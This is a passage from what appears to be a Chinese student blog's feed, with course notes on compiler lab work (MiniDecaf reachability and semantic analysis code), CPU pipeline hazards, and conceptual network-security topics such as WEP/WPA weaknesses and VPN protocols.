operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    self<span class="token punctuation">.</span>reachability <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    reachable <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nodes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>reachability<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> reachable<span class="token punctuation">:</span>            <span class="token keyword">break</span>        cur <span class="token operator">=</span> reachable<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>reachability<span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">for</span> succ <span class="token keyword">in</span> self<span class="token punctuation">.</span>getSucc<span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>reachability<span class="token punctuation">[</span>succ<span class="token punctuation">]</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>reachability<span class="token punctuation">[</span>succ<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>                reachable<span class="token punctuation">.</span>append<span class="token punctuation">(</span>succ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reachable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> self<span class="token punctuation">.</span>reachability<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果一个基本块不可达, 那么无须为它分配寄存器.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/reg/bruteregalloc.py</span><span class="token keyword">def</span> <span class="token function">accept</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> graph<span class="token punctuation">:</span> CFG<span class="token punctuation">,</span> info<span class="token punctuation">:</span> SubroutineInfo<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> bb<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>graph<span class="token punctuation">.</span>iterator<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">if</span> graph<span class="token punctuation">.</span>reachable<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>localAlloc<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> subEmitter<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="step-6-1"><a href="#step-6-1" class="headerlink" title="step 6"></a>step 6</h3><ol><li><p>请画出下面 MiniDecaf 代码的控制流图.</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> a<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> a<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>答:</strong> 这段代码的可能 TAC 码以及控制流图如下.</p><p> <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301643197.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Principles of Compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记6</title>
      <link href="/2023/11/06/ji-suan-ji-zu-cheng-yuan-li-bi-ji-6/"/>
      <url>/2023/11/06/ji-suan-ji-zu-cheng-yuan-li-bi-ji-6/</url>
      
        <content type="html"><![CDATA[<h1 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li>IF 阶段与 MEM 阶段, 一个周期内无法完成访存, 需要将其他部件全部卡住.</li><li>单周期比多周期 CPI 低, 但是多周期可以提高时钟频率, 在性能上更好.</li><li>流水线过长, 一定程度能够均分各阶段延迟, 但会引入流水线寄存器带来的固定延迟.</li><li>如何清空流水线? 插入气泡, 拒绝写寄存器、写内存等时序逻辑.</li><li>为什么加速比 &lt; 流水段数?<ul><li>流水段执行时间不等, 部分流水段时间过长;</li><li>流水线寄存器延迟;</li><li>插入气泡废弃指令.</li></ul></li><li>组合逻辑: 进入 ID 阶段即完成译码, 进入 EXE 阶段即完成执行.</li><li>时序逻辑: 进入 IF\MEM 阶段, 等待访存; 进入 WB 阶段, 下一周期写入完成.</li><li>从后向前生成控制信号, 避免信号生成遗漏.</li></ul><h2 id="Conflicts"><a href="#Conflicts" class="headerlink" title="Conflicts"></a>Conflicts</h2><ul><li>由 Von-Neumann 体系结构中指令的执行过程决定.</li><li><strong>结构冲突</strong>: 硬件资源不足.<ul><li>当 load 指令在 MEM 阶段和任意指令在 IF 阶段<strong>同时访存</strong>, 用 stall 信号卡住 MEM 阶段及以前的指令, 用 bubble 信号排空 WB 阶段的指令.</li><li>当 load 指令在 WB 阶段和其他指令在 ID 阶段<strong>同时读写寄存器</strong>, 增设读写端口避免冲突. 寄存器读是组合逻辑, 寄存器写是时序逻辑.</li><li>通过设置 I-cache 和 D-cache 增加资源.</li></ul></li><li><strong>数据冲突</strong>: 读后写冲突, 指令依赖于前面指令的结果数据.<ul><li>当读写寄存器<strong>次序冲突</strong>, 用 stall 信号卡住 ID 阶段的指令, 用 bubble 信号排空 EXE 阶段的指令.</li><li>当读写寄存器<strong>次序冲突</strong>, 使用数据旁路将 EXE 阶段的数据前传至 ID 阶段; 若为 <strong>load use 冲突</strong>, 只能使用 stall-bubble 方法, 并在 WB 阶段前传.</li></ul></li><li><strong>控制冲突</strong>: 执行分支转移类指令.<ul><li><strong>暂停</strong>流水线: 发现分支指令, 暂停流水线, 判断是否分支.</li><li><strong>预测</strong>分支<strong>不成功</strong>: IF 阶段直接取后续指令, ID\EXE 阶段判断是否分支.</li><li><strong>预测</strong>分支<strong>成功</strong>: ID 阶段计算分支地址并转移, ID\EXE 阶段判断是否分支.</li><li><strong>动态预测</strong>: 使用 BTB 表, 用 inst[11:2] 作为索引存储分支指令 inst[31:12] 和分支目标的映射. IF 阶段读取 BTB, ID\EXE 阶段计算分支目标地址和分支结果, 并填入 BTB.</li></ul></li><li><strong>卡住+气泡</strong>的延迟方法是万能的, 相当于将流水线处理器退化为多周期处理器.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全技术 笔记4</title>
      <link href="/2023/10/31/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-4/"/>
      <url>/2023/10/31/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-4/</url>
      
        <content type="html"><![CDATA[<h1 id="四、CIA-及其应用"><a href="#四、CIA-及其应用" class="headerlink" title="四、CIA 及其应用"></a>四、CIA 及其应用</h1><h2 id="计算机网络安全体系结构"><a href="#计算机网络安全体系结构" class="headerlink" title="计算机网络安全体系结构"></a>计算机网络安全体系结构</h2><ul><li><p>安全目标、服务、机制的关系:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707175.png" alt=""></p></li></ul><h3 id="安全目标"><a href="#安全目标" class="headerlink" title="安全目标"></a>安全目标</h3><ul><li>Confidentiality: 保密性.<ul><li>信息内容不会泄露给未授权实体.</li><li>业务数据、网络拓扑、流量都可能有保密性要求.</li><li>防止被动攻击.</li></ul></li><li>Integrity：完整性.<ul><li>保证信息不被未授权修改, 可以检测出来.</li><li>防止主动攻击 (篡改、插入、重放).</li></ul></li><li>Availability：可用性.<ul><li>保证授权用户访问到资源或服务.</li><li>对路由设备的处理能力、缓冲区、链路带宽等的攻击.</li><li>防止拒绝服务攻击.</li></ul></li></ul><h3 id="OSI-安全框架-X-800"><a href="#OSI-安全框架-X-800" class="headerlink" title="OSI 安全框架 (X.800)"></a>OSI 安全框架 (X.800)</h3><ul><li><p>安全服务:</p><ul><li>通过安全机制实现安全策略.</li></ul></li><li><p>安全机制:</p><ul><li>保护系统免受监听, 阻止安全攻击, 恢复系统.</li></ul></li><li><p>安全攻击:</p><ul><li><p>主动攻击、被动攻击.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707176.png" alt=""></p></li></ul></li></ul><h3 id="安全服务"><a href="#安全服务" class="headerlink" title="安全服务"></a>安全服务</h3><h4 id="Authentication-认证服务"><a href="#Authentication-认证服务" class="headerlink" title="Authentication 认证服务"></a>Authentication 认证服务</h4><ul><li>保证通信的真实性.</li><li>单条消息情况下:<ul><li>向接受方保证发送方的真实性.</li></ul></li><li>双方通信情况下:<ul><li>连接初始化阶段保证双方的真实性.</li><li>保证连接不受第三方非法伪装干扰.</li></ul></li><li>对等实体认证 (Peer Authentication):<ul><li>保证参与通信实体的身份是真实的.</li><li>实体不能试图伪装或进行非授权重放.</li><li>面向连接的应用.</li></ul></li><li>数据源认证 (Data original authentication):<ul><li>对数据来源提供确认, 但是复制和修改不提供保护.</li><li>保证接收到的信息来自宣称来源.</li><li>面向无连接的应用.</li></ul></li></ul><h4 id="Confidentiality-保密服务"><a href="#Confidentiality-保密服务" class="headerlink" title="Confidentiality 保密服务"></a>Confidentiality 保密服务</h4><ul><li>防止被动攻击, 防止流量分析.</li><li>连接保密服务与无连接保密服务</li><li>保密力度: 流、消息、选择字段.</li></ul><h4 id="Integrity-数据完整性服务"><a href="#Integrity-数据完整性服务" class="headerlink" title="Integrity 数据完整性服务"></a>Integrity 数据完整性服务</h4><ul><li>检测并防止主动攻击.</li><li>对消息流、单条消息或消息的选定部分进行保护.<ul><li>面向连接: 保证收到的消息和发出的消息一致.</li><li>面向无连接: 保证单条消息不被修改.</li></ul></li></ul><h4 id="Access-Control-访问控制服务"><a href="#Access-Control-访问控制服务" class="headerlink" title="Access Control 访问控制服务"></a>Access Control 访问控制服务</h4><ul><li>限制实体访问权限, 经过认证的合法实体可以访问.</li><li>标识与认证是访问控制的前提.</li></ul><h4 id="Non-Repudiation-抗抵赖服务"><a href="#Non-Repudiation-抗抵赖服务" class="headerlink" title="Non-Repudiation 抗抵赖服务"></a>Non-Repudiation 抗抵赖服务</h4><ul><li>防止发送方否认传输或接收方否认接收.</li><li>源发抗抵赖:<ul><li>发出后, 接收方证明消息由声称的发送方发出.</li></ul></li><li>交付抗抵赖:<ul><li>接收后, 发送方证明消息已被接收方收到.</li></ul></li></ul><h4 id="Availability-可用性服务"><a href="#Availability-可用性服务" class="headerlink" title="Availability 可用性服务"></a>Availability 可用性服务</h4><ul><li>按照授权的系统实体要求, 存取或使用系统资源.</li></ul><h3 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h3><ul><li>普通安全机制: 不属于协议层或安全服务.<ul><li>可信功能: 根据某些标准被认为是正确的.</li><li>安全标签: 指明资源的安全属性.</li><li>事件检测: 检测与安全相关的事件.</li><li>审计跟踪: 收集安全审计数据, 对系统记录和行为的回顾检查.</li><li>安全恢复: 处理来自安全机制的请求, 如事件处理和采取恢复行为.</li></ul></li><li>特定安全机制: 在特定协议层实现.<ul><li>加密机制、通信业务流量填充机制.</li><li>访问控制机制、数据完整性机制.</li><li>认证交换机制、数字签名机制.</li><li>路由控制机制、公证机制.</li></ul></li></ul><h3 id="安全攻击"><a href="#安全攻击" class="headerlink" title="安全攻击"></a>安全攻击</h3><ul><li>主动攻击: 改变系统资源或影响系统运行.</li><li>被动攻击: 了解或利用系统信息, 不影响系统资源.<ul><li>窃听和监测传输.</li><li>流量分析.</li></ul></li></ul><h2 id="无线局域网-WLAN"><a href="#无线局域网-WLAN" class="headerlink" title="无线局域网 WLAN"></a>无线局域网 WLAN</h2><h3 id="无线网络概述"><a href="#无线网络概述" class="headerlink" title="无线网络概述"></a>无线网络概述</h3><ul><li><p>计算机与移动通信技术的结合.</p></li><li><p>实现 6A 梦想/移动计算/普适计算的核心技术.</p></li><li><p>ALOHA 研究计划:</p><ul><li>最早的无线电计算机通信网 ALOHA.</li><li>采用无线电广播技术和 Pure ALOHA 协议.</li><li><p>第一个使用无线电通信代替点到点连接线路作为通信设施的计算机系统, 无线网络正式诞生.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709250.png" alt=""></p></li></ul></li></ul><h3 id="无线局域网安全威胁"><a href="#无线局域网安全威胁" class="headerlink" title="无线局域网安全威胁"></a>无线局域网安全威胁</h3><ul><li>与有线局域网相比:<ul><li>利用无线射频电波作为信息传输的媒介.</li><li>通信范围不受环境条件的限制.</li><li>无法采用物理隔离, 存在安全问题.</li></ul></li><li>安全威胁:<ul><li>无线窃听:<ul><li>无线信道具有开放性信道, 可通过窃听获得信息.</li><li>可以导致信息泄露与无线跟踪.</li></ul></li><li>假冒攻击:<ul><li>攻击者截获到合法用户身份, 假冒该身份入网.</li></ul></li><li>信息篡改:<ul><li>攻击者将窃听信息进行修改, 传给原本的接收者.</li></ul></li><li>重放、重路由、错误路由、删除消息:<ul><li>重新发送或重用消息以访问某种资源.</li><li>改变消息路由以便捕获有关信息.</li><li>将消息路由到错误的目的地.</li><li>在消息到达目的地前将消息删除掉.</li></ul></li><li>网络泛洪:<ul><li>入侵者发送大量伪造或无关消息, 使 AP 耗尽信道和系统资源.</li></ul></li></ul></li></ul><h3 id="无线局域网认证加密技术"><a href="#无线局域网认证加密技术" class="headerlink" title="无线局域网认证加密技术"></a>无线局域网认证加密技术</h3><h4 id="无加密认证"><a href="#无加密认证" class="headerlink" title="无加密认证"></a>无加密认证</h4><ul><li>无线接入点 AP:<ul><li>无线网络的创建者, 网络中心节点.</li><li>无线路由器就是一个 AP.</li></ul></li><li>STA 站点:<ul><li>连接到无线网络中的终端.</li></ul></li><li>SSID:<ul><li>为 AP 配置的标志名, 便于用户识别, 俗称 wifi 名.</li><li>使用者提出 SSID, AP 接受用户端登入请求.</li><li>AP 向外广播 SSID, 禁止广播以提高安全性.</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709252.png" alt=""></p><h4 id="WEP-有线等效保密协议"><a href="#WEP-有线等效保密协议" class="headerlink" title="WEP (有线等效保密协议)"></a>WEP (有线等效保密协议)</h4><ul><li><p>与有线网络相同级别的安全保护, 协议标准为 IEEE 802.11b.</p></li><li><p>使用 WEP 协议:</p><ul><li>无线 AP 启用 WEP 功能, 创建密钥.</li><li>每个无线客户端启用 WEP, 输入密钥, 保证安全连接.</li></ul></li><li><p>安全措施:</p><ul><li><p>认证:</p><ul><li><p>开放系统认证: 默认认证方式, 提供明文认证.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709253.png" style="zoom:50%;"></p></li><li><p>共享密钥认证.</p></li></ul></li><li><p>保密性:</p><ul><li>对称加密 RC4 流密码, 密钥长度 40/104 bits.</li><li>提供访问控制和保护隐私的功能.</li></ul></li><li><p>完整性:</p><ul><li>循环冗余校验 CRC32.</li></ul></li><li><p>密钥管理:</p><ul><li>设备与接入点共享默认密钥, 可能泄露.</li><li>设备与设备建立密钥对关系, 人工分发困难.</li></ul></li></ul></li><li><p>加密过程:</p><ul><li><p>计算校验和/加密/传输.</p></li><li><p>明文 P/初始化向量 IV/共享密钥 K0/一次性秘钥 KE/密文 Y.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709254.png" alt=""></p></li></ul></li><li><p>解密过程:</p><ul><li><p>计算一次性密钥 KE/解密/认证.</p></li><li><p>密文P/初始化向量 IV/共享密钥 K0/一次性秘钥 KE/明文 P.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709255.png" alt=""></p></li></ul></li><li><p>安全性分析:</p><ul><li>同一个 SSID 所有 STA 和 AP 共享密钥, 容易泄露.</li><li>RC4 是序列密码加密算法, 容易被破译.</li><li>RC4 的初始化向量 IV 明文发送.</li><li>24 bits 初始化向量 IV 容易重复.</li><li>CRC32 是非加密线性运算, 用于检测随机错误, 无法实现消息认证.</li><li>WEP 协议不含序列号, 无法确定帧顺序, 无法抵抗重放攻击.</li></ul></li></ul><h4 id="WPA-WiFi-安全存取"><a href="#WPA-WiFi-安全存取" class="headerlink" title="WPA (WiFi 安全存取)"></a>WPA (WiFi 安全存取)</h4><ul><li><p>WPA1:</p><ul><li><p>安全措施:</p><ul><li>认证:<ul><li>802.1x 协议 (WPA 企业版).</li><li>PSK (预先共享密钥) 模式 (WPA 个人版).</li></ul></li><li>保密性:<ul><li>RC4 流密码加密, 密钥长度 128 位.</li></ul></li><li>完整性:<ul><li>更安全的消息认证码 MIC.</li><li>MIC 包含帧计数器, 防范重放攻击.</li></ul></li></ul></li><li><p>核心:</p><ul><li><p>TKIP 协议:</p><ul><li>在 WEP 外围的一层外壳.</li><li>使用同样加密引擎和 RC4 算法, 密钥长度 128 位, 解决短密钥问题.</li><li>动态变化每个数据包的密钥, 通过多种因素混合生成.</li><li>数据包有独有的 48 位序列号, 防范重放攻击.</li></ul></li><li><p>IEEE 802.1x:</p><ul><li>针对以太网提出, 基于端口的网络访问控制, 利用物理层特性对连接到无线端口的设备进行身份认证.</li><li>基于 C/S 模式, 无线终端与 AP 连接前认证用户身份合法性.</li><li>无线终端向 AP 发起连接请求时, AP 要求输入用户名和密码, 送到验证服务器验证, 验证通过允许享用网络资源, 否则禁止设备访问.</li><li><p>与上层认证协议 EAP 配合, 实现用户认证和密钥分发.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709256.png" alt=""></p></li></ul></li></ul></li></ul></li><li><p>WPA2:</p><ul><li>无线局域网安全标准 IEEE 802.11i 公布, WPA2 随之公布公布.</li><li>安全措施:<ul><li>更安全的 CCMP 消息认证代替 MIC 算法.</li><li>AES 对称加密代替 RC4 流密码.</li><li>支持 802.11g 或以上无线网卡.</li></ul></li></ul></li><li><p>WPA 采用密钥分发机制, 不断转换密钥, 使公共场所、学术环境部署无线网络成为可能.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709257.png" alt=""></p></li></ul><h2 id="虚拟专用网-VPN"><a href="#虚拟专用网-VPN" class="headerlink" title="虚拟专用网 VPN"></a>虚拟专用网 VPN</h2><h3 id="VPN-需求背景"><a href="#VPN-需求背景" class="headerlink" title="VPN 需求背景"></a>VPN 需求背景</h3><ul><li>TCP/IP 协议的固有安全缺陷:<ul><li>攻击者通过软件设置 IP 地址, 监听并篡改、重放数据包内容.</li><li>IP 协议支持源路由方式, 源发方可以制定中间路由, 埋下源路由攻击隐患.</li><li>TCP/IP 协议序列号容易被猜测, 不检查参数导致缓冲区溢出.</li></ul></li><li>物理专用网价格高昂, 架设实施难度大.</li><li>高性能、高速度和高安全专用网需求强烈.</li></ul><h3 id="VPN-安全功能"><a href="#VPN-安全功能" class="headerlink" title="VPN 安全功能"></a>VPN 安全功能</h3><ul><li>通过私有通道, 在公共网络上仿真点到点私有连接.</li><li>任意两个节点间的连接没有端到端物理链路, 利用公众网资源动态组成.</li><li>连接远程用户、公司分支机构、业务伙伴.</li><li>安全功能:<ul><li>数据机密性保护.</li><li>数据完整性保护.</li><li>数据源身份认证.</li><li>重放攻击保护.</li></ul></li></ul><h3 id="VPN-解决方案"><a href="#VPN-解决方案" class="headerlink" title="VPN 解决方案"></a>VPN 解决方案</h3><ul><li>数据链路层:<ul><li>L2TP/PPTP/L2F.</li><li>存在认证、完整性、密钥管理等不足, 很少应用.</li><li>L2TP 的缺陷:<ul><li>认证: 仅对通道终端实体进行, 不认证每个数据报文, 无法抵抗插入攻击、地址欺骗攻击.</li><li>完整性: 没有针对每个数据报文进行校验, 可能进行拒绝服务攻击.</li><li>密钥管理: 报文可加密, 不支持密钥自动产生刷新, 可能破解密钥.</li></ul></li></ul></li><li>网络层:<ul><li>IPSec 在 IP 层加密(或)认证所有流量, 在 IPv4 和 IPv6 中都适用.</li><li>保障 IP 级安全:<ul><li>认证: 确保从包头标识源端发出, 传输过程中未被篡改.</li><li>保密: 报文加密后传输, 防止窃听.</li><li>密钥管理: 与密钥的安全交换相关.</li></ul></li></ul></li><li>传输层:<ul><li>SSL 协议的零客户端 (客户端可在没有证书情况下连接服务器)、低成本是最大优势.</li><li>适用于任何基于 B/S 结构的应用.</li><li>像视频会议的非 B/S 结构业务无法通过 SSL VPN 建立.</li><li>实际应用中:<ul><li>SSL VPN 和 IPsec VPN 往往结合实行.</li><li>SSL VPN 网关和 IPsec 网关有时也集成到一个设备.</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Network Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理 实验2</title>
      <link href="/2023/10/29/bian-yi-yuan-li-lab-2/"/>
      <url>/2023/10/29/bian-yi-yuan-li-lab-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Stage-2-报告"><a href="#Stage-2-报告" class="headerlink" title="Stage 2 报告"></a>Stage 2 报告</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="step-5"><a href="#step-5" class="headerlink" title="step 5"></a>step 5</h3><p><strong>语义分析</strong>: 实现了声明语句、赋值语句、标识符的语义分析函数.</p><p>在 <code>visitDeclaration</code> 中检查定义域中是否存在定义冲突, 在 <code>visitIdentifier</code> 中需要检查变量是否存在.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py:class Namer</span><span class="token keyword">def</span> <span class="token function">visitDeclaration</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> decl<span class="token punctuation">:</span> Declaration<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> Scope<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> ctx<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span>decl<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafDeclConflictError<span class="token punctuation">(</span>decl<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token comment"># 构造 VarSymbol 对象, 将其加入符号表, 并设置 decl 的 symbol 属性</span>    symbol <span class="token operator">=</span> VarSymbol<span class="token punctuation">(</span>decl<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">,</span> decl<span class="token punctuation">.</span>var_t<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>declare<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>    decl<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">,</span> symbol<span class="token punctuation">)</span>    <span class="token keyword">if</span> decl<span class="token punctuation">.</span>init_expr<span class="token punctuation">:</span>        decl<span class="token punctuation">.</span>init_expr<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitAssignment</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> Assignment<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> Scope<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token comment"># 参考 `visitBinary` 的实现</span>    expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitIdentifier</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ident<span class="token punctuation">:</span> Identifier<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> Scope<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    symbol <span class="token operator">=</span> ctx<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> symbol<span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafUndefinedVarError<span class="token punctuation">(</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token comment"># 设置 ident 的 symbol 属性</span>    ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">,</span> symbol<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>中间代码生成</strong>: 为标识符、声明语句、赋值语句实现了中间代码生成函数. 递归访问每个子节点, 为声明的标识符分配临时寄存器, 并为表达式类型设置返回值 <code>val</code>. 需要注意在赋值时, 左端项需要是左值.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/tacgen/tacgen.py:class TACGen</span><span class="token keyword">def</span> <span class="token function">visitIdentifier</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ident<span class="token punctuation">:</span> Identifier<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token comment"># 设置返回值为标识符对应的 temp 寄存器</span>    ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitDeclaration</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> decl<span class="token punctuation">:</span> Declaration<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    decl<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp <span class="token operator">=</span> mv<span class="token punctuation">.</span>freshTemp<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decl<span class="token punctuation">.</span>init_expr<span class="token punctuation">:</span>        <span class="token comment"># 对子节点进行 accept</span>        decl<span class="token punctuation">.</span>init_expr<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>        <span class="token comment"># 模仿 `visitAssignment` 函数进行赋值</span>        decl<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span>            <span class="token string">"val"</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitAssignment<span class="token punctuation">(</span>decl<span class="token punctuation">.</span><span class="token 